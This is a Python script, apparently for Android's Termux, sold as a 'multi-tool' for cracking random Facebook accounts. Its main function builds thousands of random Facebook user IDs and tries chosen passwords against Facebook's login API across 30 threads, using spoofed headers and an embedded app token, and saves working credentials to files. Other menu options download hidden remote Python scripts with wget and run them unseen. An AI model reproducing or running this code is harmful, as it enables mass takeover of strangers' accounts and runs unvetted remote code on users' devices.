W = '\033[97;1m' 
R = '\033[91;1m' 
G = '\033[92;1m' 
Y = '\033[93;1m' 
B = '\033[94;1m'
P = '\033[95;1m'
C = '\033[96;1m'
N = '\x1b[0m'



import os
try:
	import requests
except ImportError:
	os.system("pip install requests")

try:
	import concurrent.futures
except ImportError:
	os.system("pip install futures")

import os
import sys
import time
import requests
import random
import platform
import base64
import subprocess
from concurrent.futures import ThreadPoolExecutor


def runtxt(z):
    for e in z + "\n":
        sys.stdout.write(e)
        sys.stdout.flush()
        time.sleep(0.03)



def helpnote():
	print("%s [*] FOLLOW ME ON Fb To KNOW ABOUT UPDATES  :)"%(G))
	subprocess.check_output(["am", "start", "https://raw.githubusercontent.com/SHAHZADA-AHMED/OldCrack/main/Premium.txt"])
	exit(" [*] TELEGRAM : https://t.me/SHAHZADA-AHMED ")


def notice():


	runtxt("\n\033[0;91m YOU ARE NOT PREMIUM USER ")
	runtxt("\033[0;93m SEND THIS KEY TO ADMIN FOR \033[0;96m FREE APPROVAL&gt;&gt; %s%s"%(G,basesplit))
	runtxt("\033[0;92m BYPASS ADMIN TELEGRAM &gt;&gt; https://t.me/SHAHZADA-AHMED")
	runtxt("\033[0;95m    &lt;===================☠️  \033[0;97mEXIT\033[0;95m ☠️===================&gt; ")
	subprocess.check_output(["am", "start", "https://t.me/SHAHZADA-AHMED"])


        
plist = (platform.uname())[2]
basex = plist
basex1 = basex.encode('ascii')
basex2 = base64.b64encode(basex1)
basex3 = basex2.decode('ascii')
base4 = (basex3).upper()
basesplit = base4.replace('=', 'X').replace('A', '3').replace('B', '9').replace('C', '7').replace('D', '1').replace('E', '4').replace('M', '2').replace('L', '6').replace('F', '8').replace('N', 'E').replace('T', '8')


class Main:
	def __init__(self):
		self.id = []
		self.ok = []
		self.cp = []
		self.loop = 0
		try:
			plr = requests.get('https://raw.githubusercontent.com/SHAHZADA-AHMED/OldCrack/main/Premium.txt').text
			if basesplit in plr:
				key = basesplit
				stat = ("\033[0;92mPREMIUM")
				FY = '\033[0;93m'
				FG = '\033[0;92m'
				GET = '\r'
			else:
				key = ("\033[0;91m -")
				stat = ("\033[0;91mFREE USER")
				FY = '\033[0;90m'
				FG = '\033[0;90m'
				GET = '\033[0;92m [P] GET PREMIUM'
		except requests.exceptions.ConnectionError:
			print("\n%s [!] NO INTERNET CONNECTION..\n"%(R))
			exit()
		os.system("clear")
		
		print("\n"+C+" ███████  █████       ██      ██  █████  ██████\n██      ██   ██      ██      ██ ██   ██ ██   ██ "+Y+"|SAJU"+C+"\n███████ ███████      ██      ██ ███████ ██   ██ "+Y+"|Ahmed"+C+"\n██ ██   ██ ██   ██ ██   ██ ██   ██ ██   ██ "+Y+"|SAJU"+C+"\n███████ ██   ██  █████   █████  ██   ██ ██████\n "+N+"──────────────────────────────────────────────────"+G+"\n▸ AUTHOR     : 𒄬 𓆩⃝𝑴𝑹𓆪 ᭄𝑺𝑨𝑱𝑱𝑨𝑫𓆩⁽๏̬̬̬̬̽̽̈⁾𓆪』\n▸ FACEBOOK   : FACEBOOK.COM/https://m.me/Tera.Bap.Ka.Id.Hain\n▸ YOUTUBE    : YOUTUBE.COM/https://youtube.com/channel/UCnqzQlWYSA9vk-LPiK4w21g\n▸ GITHUB     : GITHUB.COM/SHAHZADA-AHMED\n"+N+"─────────────────────────────────────────────────\n")
		print("%s [%s•%s] %sTOOL NAME : %sMULTI-TOOL"%(G,R,G,B,G))
		print("%s [%s•%s] %sVERSION   : %s1.0"%(G,R,G,B,G))
		print("%s [%s•%s] %sYOUR KEY  : %s%s"%(G,R,G,B,G,key))
		print("%s [%s•%s] %sSTATUS    : %s"%(G,R,G,B,stat)) 
		print("")
		runtxt("\033[97;1m    &lt;=======   Every tool here is free, Enjoy   =======&gt;")
		runtxt("\n    \033[0;92m &lt;=======    𝐀𝐁𝐈𝐑 𝐔𝐈𝐃 𝐂𝐋𝐎𝐍𝐄𝐑    =======&gt;  \033[0;97m ")
		print("%s [%s1%s]%s CRACK RANDOM FB ID 2008-11 {JUST NOW} %s(PAID)"%(G,R,G,Y,B))
		print("%s [%s2%s]%s GO TO V2 CLONER %s(PRO)"%(G,R,G,Y,B))
		print("%s [%s3%s]%s GO TO V3 CLONER %s(PRO MAX)"%(G,R,G,Y,B))
		print("%s [%s4%s]%s FILE CLONER {JUST NOW} %s(TOP RATED)"%(G,R,G,Y,B))
		print("")
		
		
		type = input("    \033[0;91m(#)\033[0;92m CHOOSE : ")
		if type in ["", " "]:
			Main()
		elif type in ["1", "01"]:
			if basesplit in plr:
			        self.fbtua()
			else: 
				notice()
				exit()
		elif type in ["2", "02"]:
			if basesplit in plr:
			        self.v2()
			else: 
				notice()
				exit()
		
		elif type in ["3", "03"]:
			if basesplit in plr:
			        self.v3()
			else: 
				notice()
				exit()
		
		elif type in ["4", "04"]:
			if basesplit in plr:
			        self.fmain()
			else: 
				notice()
				exit()
		
		else:
			Main()
	def fbtua(self):
		x = 111111111
		xx = 999999999
		idx = "100000" 
		limit = int(input("    \033[0;91m[+]\033[0;92m TOTAL IDS TO CRACK (LIMIT 50000): "))
		try:
			for n in range(limit):
				_ = random.randint(x,xx)
				__ = idx
				self.id.append(__+str(_))
			print("\033[0;93m [+] TOTAL ID -&gt; \033[0;91m%s\033[0;97m"%(len(self.id))) 
			with ThreadPoolExecutor(max_workers=30) as coeg:
				print("\n%s [!] USE %s, %s(COMMA)%s FOR SEPARATOR "%(Y,G,B,Y))
				print("%s EXAMPLE : %s123456,1234567,123456789"%(Y,G))
				listpass = input("%s [?] ENTER PASSWORD :%s "%(Y,G))
				if len(listpass)&lt;=6:
					exit("\n%s [!] PASSWORD MINIMUM 6 CHARACTERS"%(R))
				print("%s [*] CRACK WITH PASSWORD -&gt; [\033[0;91m%s\033[0;93m]"%(Y,listpass))
				print("\n%s [+] OK RESULTS SAVED IN -&gt; ok.txt"%(G))
				print("%s [+] CP RESULTS SAVED IN -&gt; cp.txt"%(Y))
				print("%s [!] IF NO RESULT TURN ON AIRPLANE MODE 5 SECONDS\x1b[0m\n"%(R))
				for user in self.id:
					coeg.submit(self.api, user, listpass.split(","))
			exit("\n\n    [#] CRACK COMPLETE...")
		except Exception as e:exit(str(e))
	def v2(self):
		if	os.path.isfile('.v2.py'):
			os.system("pkg install wget -y")
			os.system("pip install requests &amp;&amp; pip install bs4 &amp;&amp; clear &amp;&amp; wget https://raw.githubusercontent.com/SHAHZADA-AHMED/MultiTool/main/.v2.py &amp;&amp; clear &amp;&amp; python .v2.py")

		else:
			os.system("pkg install wget -y")
			os.system("wget https://raw.githubusercontent.com/SHAHZADA-AHMED/MultiTool/main/.v2.py &amp;&amp; clear &amp;&amp; python .v2.py")
			
			
	def v3(self):
		if	os.path.isfile('.v3.py'):
			os.system("pkg install wget -y")
			os.system("pip install requests &amp;&amp; pip install bs4 &amp;&amp; clear &amp;&amp; wget https://raw.githubusercontent.com/SHAHZADA-AHMED/MultiTool/main/.v3.py &amp;&amp; clear &amp;&amp; python .v3.py")

		else:
			os.system("pkg install wget -y")
			os.system("wget https://raw.githubusercontent.com/SHAHZADA-AHMED/MultiTool/main/.v3.py &amp;&amp; clear &amp;&amp; python .v3.py")

	def fmain(self):
		if	os.path.isfile('.fmain.py'):
			os.system("pkg install wget -y")
			os.system("pip install requests &amp;&amp; pip install bs4 &amp;&amp; clear &amp;&amp; wget https://raw.githubusercontent.com/SHAHZADA-AHMED/MultiTool/main/.fmain.py &amp;&amp; clear &amp;&amp; python .fmain.py")

		else:
			os.system("pkg install wget -y")
			os.system("wget https://raw.githubusercontent.com/SHAHZADA-AHMED/MultiTool/main/.fmain.py &amp;&amp; clear &amp;&amp; python .fmain.py")

	def custom(self):
		print("")



	def api(self, uid, pwx):
		ua = random.choice([
			"Dalvik/1.6.0 (Linux; U; Android 4.4.2; NX55 Build/KOT5506) [FBAN/FB4A;FBAV/106.0.0.26.68;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/it_IT;FBRV/45904160;FBCR/PosteMobile;FBMF/asus;FBBD/asus;FBPN/com.facebook.katana;FBDV/ASUS_Z007;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a;]", 
			"Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]"
		])
		sys.stdout.write(
			"\r\r %s[&gt;_] [BY] : %s/%s -&gt; \033[0;92m [ BY-OK:%s ]- \033[0;91m[BY-CP:%s ]"%(B,self.loop, len(self.id), len(self.ok), len(self.cp))
		); sys.stdout.flush()
		for pw in pwx:
			pw = pw.lower()
			ses = requests.Session()
			headers = {
				"x-fb-connection-bandwidth": str(random.randint(20000000.0, 30000000.0)), 
				"x-fb-sim-hni": str(random.randint(20000, 40000)), 
				"x-fb-net-hni": str(random.randint(20000, 40000)), 
				"x-fb-connection-quality": "EXCELLENT",
				"x-fb-connection-type": "cell.CTRadioAccessTechnologyHSDPA",
				"user-agent": ua, 
				"content-type": "application/x-www-form-urlencoded", 
				"x-fb-http-engine": "Liger"
			}
			response = ses.get("https://b-api.facebook.com/method/auth.login?format=json&amp;email="+str(uid)+"&amp;password="+str(pw)+"&amp;credentials_type=device_based_login_password&amp;generate_session_cookies=1&amp;error_detail_type=button_with_disabled&amp;source=device_based_login&amp;meta_inf_fbmeta=%20&amp;currently_logged_in_userid=0&amp;method=GET&amp;locale=en_US&amp;client_country_code=US&amp;fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&amp;access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&amp;fb_api_req_friendly_name=authenticate&amp;cpl=true", headers=headers) 
			if "session_key" in response.text and "EAAA" in response.text:
				print("\r  \033[0;92m   [BY-OK] %s | %s\033[0;97m         "%(uid, pw))
				self.ok.append("%s|%s"%(uid, pw))
				open("ok.txt","a").write("  * --&gt; %s|%s\n"%(uid, pw))
				break
			elif "www.facebook.com" in response.json()["error_msg"]:
				print("\r  \033[0;91m   [BY-CP] %s | %s\033[0;97m         "%(uid, pw))
				self.cp.append("%s|%s"%(uid, pw))
				open("cp.txt","a").write("  * --&gt; %s|%s\n"%(uid, pw))
				break
			else:
				continue

		self.loop +=1

if len(sys.argv) == 2:
	if sys.argv[1] == "--info":
		print("   ___________________        \n  /  _____/\_   _____/        \n /   \  ___ |    __)          \n \    \_\  \|     \ \033[0;96mGALAXY\033[0;97m        \n  \______  /\___  /__\033[0;96mFACEBOOK\033[0;97m_\n         \/     \/_____/_____/")
		print("\n [*] Author    :  ")
		print(" [*] Team      :  \n")
		print(" [ Sosial Medi  ] \n")
		print(" [*] Facebook  : https://facebook.com/ ")
		print(" [*] Instagram : https://instagram.com/ ")
		print(" [*] YouTube   : https://youtube.com/ ")
		exit(" [*] GitHub    : https://github.com/ ")
	else:
		Main()

try:Main()
except Exception as e:exit(str(e))